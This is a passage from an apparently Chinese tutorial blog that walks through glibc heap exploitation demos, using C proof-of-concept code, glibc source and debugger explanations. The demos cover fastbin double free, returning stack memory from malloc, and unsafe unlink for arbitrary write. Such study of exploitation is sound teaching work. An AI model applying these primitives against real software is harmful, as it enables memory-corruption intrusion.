class="number">0</span>) &#123;</span><br><span class="line">   <span class="keyword">do</span> &#123;</span><br><span class="line">     check_inuse_chunk(av, p);</span><br><span class="line">     nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">     size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">     nextchunk = chunk_at_offset(p, size);</span><br><span class="line">     nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">       prevsize = p-&gt;prev_size;</span><br><span class="line">       size += prevsize;</span><br><span class="line">       p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">       unlink(av, p, bck, fwd);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">       nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">         size += nextsize;</span><br><span class="line">         unlink(av, nextchunk, bck, fwd);</span><br><span class="line">       &#125; <span class="keyword">else</span></span><br><span class="line">         clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">       first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">       unsorted_bin-&gt;fd = p;</span><br><span class="line">       first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">         p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">         p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       set_head(p, size | PREV_INUSE);</span><br><span class="line">       p-&gt;bk = unsorted_bin;</span><br><span class="line">       p-&gt;fd = first_unsorted;</span><br><span class="line">       set_foot(p, size);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">       size += nextsize;</span><br><span class="line">       set_head(p, size | PREV_INUSE);</span><br><span class="line">       av-&gt;top = p;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">   &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于这个函数流程做个简单的解释</p>
<p>先通过<code>get_max_fast</code>函数确定堆是否被初始化了，如果没有初始化堆然后退出函数</p>
<p>从fastbin中获取一个空闲chunk，并首先尝试向后合并，这里向后合并指的是向低地址合并</p>
<p>然后尝试向前合并，如果此时于<code>top_chunk</code>相邻，就合并到<code>top_chunk</code>中</p>
<p>如果不相邻就放入到unsorted bin中，然后继续取fastbin chunk直到fastbin list为空结束</p>
<p>本例中的触发代码：</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508588455/0" alt="image-20210510133037099"></p>
<p>这里有个疑惑就是，不是说好的放入unsorted bin中嘛，为什么会出现在small bin中，其实我们在分配largebin时，ptmalloc会首先遍历一下fastbin，将相邻的chunk进行合并，并链接到unsorted bin中，然后遍历unsorted bin中的chunk，如果unsorted bin中只有一个chunk，并且这个chunk在上次分配时被使用过，并且所需要分配的chunk大小属于small bins，并且chunk的大小大于等于所需分配的大小，这种情况下就算直接将该chunk进行切割，分配结束，否则将根据chunk的空间大小将其放入small bins或是largin bins中</p>
<p>这就是为什么不在unsorted bin而在small bin中的原因了</p>
<blockquote>
<p>如果连large bin中都没有合适的，那就只能从top chunk中分割出一部分了，如果连top chunk也不满足，那就会mmap或者brk一块内存增加top chunk的大小</p>
</blockquote>
<p>我们此时继续free p1</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508752242/0" alt="image-20210510141428106"></p>
<p>我们可以看到他现在既在small bin中又在fast bin中了，这是为什么呢</p>
<p>我们再次free的时候ptmalloc会发现fastbin是空闲的，因此就把他扔到fastbin中去了，此时就可以分配两次p1了，一次会在fastbin中取出(优先查看fastbin)，第二次就会在smallbin中取出:)</p>
<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>程序先malloc了两个fastbin(0x40)，然后free掉第一个chunk</p>
<p>这里为什么不free掉第二个chunk，因为第二个chunk是跟top chunk相邻，如果free了就会合并到top chunk中</p>
<p>之后程序调用了malloc函数malloc了一个large bin，触发了malloc_consoldate函数，导致我们free掉的chunk进入了small bin中然后程序第二次free chunk1，ptmalloc会先看fastbin中有没有，发现没有，于是就把chunk放入到fastbin中，这是chunk在fastbin和small bin中就各有一个，此时程序再申请两次0x40的chunk,ptmalloc先从fastbin中把chunk1取出来给用户,然后再从smallbin中再次把chunk1取出来给用户，我们就有了两个拥有同样内存的chunk。</p>
<h1 id="0x04-fastbin-dup-into-stack"><a href="#0x04-fastbin-dup-into-stack" class="headerlink" title="0x04 fastbin_dup_into_stack"></a>0x04 fastbin_dup_into_stack</h1><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这个程序就是fast_dup的2.0版，作用就是欺骗系统把malloc的地址转到我们所能控制内容的栈上,也就是让下一次分配内存时		在我们所能控制的栈上分配</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//我们控制分配的地址就是这个栈上变量的地方</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里还是一样的,不能连续释放同一个chunk</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里再次,释放a,double free</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">    <span class="comment">//现在第一次分配内存,取出chunk a 赋给chunk d</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//现在分配两次内存,取出chunk a,chunk b</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">    <span class="comment">//现在free list就只剩下一个chunk a了</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">    <span class="comment">//现在的chunk a是free list的头chunk了,现在我们把一个假的free size写到栈上,这个时候ptmalloc就会认为栈上有一个free的chunk,就会把指针回转给他了</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//现在我们把栈指针的向前八个字节写成0x20,也就是伪造free size,然后把他赋给d</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个时候就把栈指针写到了free list上了,此时再分配就是在栈上分配了</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-2"><a href="#运行结果及调试-2" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先看下分配完三个chunk后的结果</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508844964/0" alt="image-20210510143659280"></p>
<p>此时我们利用fastbin的double free来形成一个环</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508848465/0" alt="image-20210510143743534"></p>
<p>接下来我们要将第二次free的a给申请回来，作为我们的d，并且将这个d的fd赋值为stack_var的地址</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508861212/0" alt="image-20210510144108062"></p>
<p>能看到此时我们的d的fd地方已经写上了stack_var的地址</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13508873167/0" alt="image-20210510144425686"></p>
<p>此时我们的free list中有了栈指针，我们再继续分配就可以分配到栈的内存空间了</p>
<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>程序先在栈上定义了一个变量stack_var</p>
<p>之后malloc了三个chunk a,b,c</p>
<p>之后做了一个double free,形成了一个a-&gt;b-&gt;a的free链</p>
<p>此时再次malloc了一个大小一样的chunk d,这个时候chunk d会拿出chunk a</p>
<p>之后我们又申请了一个一样大小的chunk出来拿出了b,这个时候链上就只剩下一个a了</p>
<p>此时我们伪造了stack_var,把他伪装成了一个free chunk,并且赋值给了chunk d,也就是chunk a,此时fd指针被伪造成了fake chunk,形成了一个新的free链</p>
<p>最后再申请内存的时候,我们就取出了栈上的内存</p>
<p>这种利用手法，变体的一种方式，也是平时做题时常用的一种手法就是栈地址变成了堆地址。</p>
<h1 id="0x05-unsafe-unlink"><a href="#0x05-unsafe-unlink" class="headerlink" title="0x05 unsafe_unlink"></a>0x05 unsafe_unlink</h1><p>unlink是一种经常会用到的技巧，关于unlink是什么就不介绍了，简单说下使用unlink的时机</p>
<ul>
<li>malloc<ol>
<li>在恰好大小的large chunk处取chunk时</li>
<li>在比请求大小大的bin中取chunk时</li>
</ol>
</li>
<li>free<ol>
<li>后向合并，合并物理相邻低物理地址空闲chunk时</li>
<li>前向合并，合并物理相邻高物理地址空闲chunk时(top chunk除外)</li>
</ol>
</li>
<li>malloc_consolidate<ol>
<li>后向和并，合并物理相邻低地址空闲chunk时</li>
<li>前向合并，合并物理相邻高地址空闲chunk时(top chunk除外)</li>
</ol>
</li>
<li>realloc<ol>
<li>前向拓展，合并物理相邻高地址空闲chunk（top chunk除外）</li>
</ol>
</li>
</ul>
<p>关于攻击效果的话就是p处的指针会变为 p-0x18</p>
<h2 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">   <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//本测试的重点就是利用free来破坏我们的全局全局chunk0_ptr以实现任意地址写</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">   <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 全局指针为chunk0_ptr，我们将要攻击的chunk为chunk1_ptr </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 我们要在chunk0中伪造一个chunk</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">   <span class="comment">// 我们把我们的fake_chunk的fd指向我们的chunk0_ptr来满足P-&gt;FD-&gt;BK=P </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">   chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">   <span class="comment">// 我们把我们的fake_chunk的bk指针指向我们的chunk0_ptr来满足P-&gt;BK-&gt;FD</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">   <span class="comment">//通过这么设置,我们就可以成功bypass堆的检测即(P-&gt;FD-&gt;BK!=P||P-&gt;BK-&gt;FD!=P)==FALSE </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">   chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//我们假设我们可以通过溢出chunk0使得我们可以自由的更改chunk1的内容</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">   <span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//我们用chunk1的previous_size来收缩chunk0，让free认为我们的chunk0是在我们伪造的chunk地方开始的</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">   chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">   <span class="comment">//如果我们正常的free chunk0，那么chunk1的pre_size将是0x90，然后现在是一个新的值 </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">   <span class="comment">//我们通过将chunk1的pre_inuse设置为false，就可以将我们所伪造的chunk标记为free状态</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">   chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//现在我们free chunk1，这是发生向后合并将会unlink我们所伪造的chunk，从而覆写chunk0_ptr</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">   <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//在这个指针上，我们可以通过chunk0_ptr来覆写其自身以指向任意内存</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">   <span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">   <span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">   chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//chunk0_ptr如今指向了我们想要的地方，我们可以用它来写我们的字符串了</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">   chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// sanity check</span></span><br><span class="line">   assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在进行调试前我们先康康unlink的部分代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1344</span><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="number">1345</span>     FD = P-&gt;fd;                                                               \</span><br><span class="line"><span class="number">1346</span>     BK = P-&gt;bk;                                                               \</span><br><span class="line"><span class="number">1347</span>     <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     \</span><br><span class="line"><span class="number">1348</span>       malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"><span class="number">1349</span>     <span class="keyword">else</span> &#123;                                                                    \</span><br><span class="line"><span class="number">1350</span>         FD-&gt;bk = BK;                                                          \</span><br><span class="line"><span class="number">1351</span>         BK-&gt;fd = FD;                                                          \</span><br><span class="line"><span class="number">1352</span>         <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                                      \</span><br><span class="line"><span class="number">1353</span>             &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                \</span><br><span class="line"><span class="number">1354</span>             <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        \</span><br><span class="line"><span class="number">1355</span>                 || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line"><span class="number">1356</span>               malloc_printerr (check_action,                                  \</span><br><span class="line"><span class="number">1357</span>                                <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line"><span class="number">1358</span>                                P, AV);                                        \</span><br><span class="line"><span class="number">1359</span>             <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                    \</span><br><span class="line"><span class="number">1360</span>                 <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line"><span class="number">1361</span>                   FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                     \</span><br><span class="line"><span class="number">1362</span>                 <span class="keyword">else</span> &#123;                                                        \</span><br><span class="line"><span class="number">1363</span>                     FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                         \</span><br><span class="line"><span class="number">1364</span>                     FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                         \</span><br><span class="line"><span class="number">1365</span>                     P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                         \</span><br><span class="line"><span class="number">1366</span>                     P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                         \</span><br><span class="line"><span class="number">1367</span>                   &#125;                                                           \</span><br><span class="line"><span class="number">1368</span>               &#125; <span class="keyword">else</span> &#123;                                                        \</span><br><span class="line"><span class="number">1369</span>                 P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \</span><br><span class="line"><span class="number">1370</span>                 P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \</span><br><span class="line"><span class="number">1371</span>               &#125;                                                               \</span><br><span class="line"><span class="number">1372</span>           &#125;                                                                   \</span><br><span class="line"><span class="number">1373</span>       &#125;                                                                       \</span><br><span class="line"><span class="number">1374</span> &#125;</span><br></pre></td></tr></table></figure>
<p>这里最主要需要绕过的地方就是(FD-&gt;bk != P || BK-&gt;fd != P)这里了，我们根据函数传进来的解释下</p>
<p>FD就算我们传进来的指针P的fd指针也就是FD=P-&gt;fd，而BK就是P-&gt;bk</p>
<p>也就是说我们需要满足的FD -&gt; bk = P，BK -&gt; fd = P其实就是</p>
<ol>
<li>P -&gt; fd -&gt; bk = P，即检测P的后一个空闲指针的前一个指针为P</li>
<li>P -&gt; bk -&gt; fd = P，同理检测P的前一个空闲指针的后一个指针为P</li>
</ol>
<p>那么如何利用呢，我们调试康康</p>
<h2 id="运行结果及调试-3"><a href="#运行结果及调试-3" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先我们停在mallc chunk0的地方</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509297120/0" alt="image-20210510160016743"></p>
<p>此时我们有了一个chunk，接着我们再申请一个chunk，看下此时的堆块</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509212229/0" alt="image-20210510160233831"></p>
<p>接着我们执行到下面的代码处</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509222674/0" alt="image-20210510160420701"></p>
<p>注释中说我们将fake_chunk的fd指向我们chunk0_ptr</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509495488/0" alt="image-20210510165958080"></p>
<p>这里一共输出了五样东西，可以看到chunk0_ptr[2]的值已经变成了&amp;chunk0_ptr-0x18</p>
<p>还记得之前说过的，我们需要在chunk0中伪造一个fake chunk</p>
<p>我们的chunk0_ptr是从0x603000开始的，但是我们要知道的是给用户的指针是从0x603010开始的，也就意味着我们的fake_chunk是从0x603010开始，以0x603020为fd指针，0x603028为bk指针</p>
<p>此时我们的fd指针已经伪造好了，下面我们直接结束伪造bk指针的部分，康康此时的堆</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509526752/0" alt="image-20210510170603411"></p>
<p>好了，此时我们已经成功的伪造了我们的fake_chunk的fd和bk指针，程序注释说我们这样就可以成功bypass那两个条件，也就是P-&gt;FD-&gt;BK=P&amp;&amp;P-&gt;BK-&gt;FD=P了，这是为什么呢？</p>
<p>我们现在假设我们的fake_chunk的size已经设好了，并且他的fd=0x602060，bk=0x602068，那么</p>
<p>fake_chunk-&gt;fd-&gt;bk是多少呢，我们看一下</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509546783/0" alt="image-20210510170903296"></p>
<p>可以看到此时的fake_chunk-&gt;fd-&gt;bk=0x603010，还记得我们刚刚所说的，我们所伪造的fake_chunk就是0x603010</p>
<p>此时第一个条件已经达成了，我们再来看看第二个条件，也就是P-&gt;BK-&gt;FD=P</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509562621/0" alt="image-20210510171128701"></p>
<p>同样的，我们成功达成了第二个条件，此时的fake_chunk也就是指向我们全局变量的chunk0_ptr已经可以bypass了，现在值得注意的是我们刚刚假设size已经设好了，但其实并没有</p>
<p>那么根据程序所说，假设我们可以溢出chunk0来自由的更改chunk1的内容，我们就可以通过更改chunk1的pre_size域来使得我们的chunk收缩以骗过malloc让他认为我们的chunk1的上一个chunk是从我们的fake_chunk开始的</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509594767/0" alt="image-20210510171652381"></p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509596070/0" alt="image-20210510171707941"></p>
<p>可以看到我们此时获取到了chunk1的地址，此时是为了修改chunk1的pre_size来实现chunk0收缩</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509618775/0" alt="image-20210510172122600"></p>
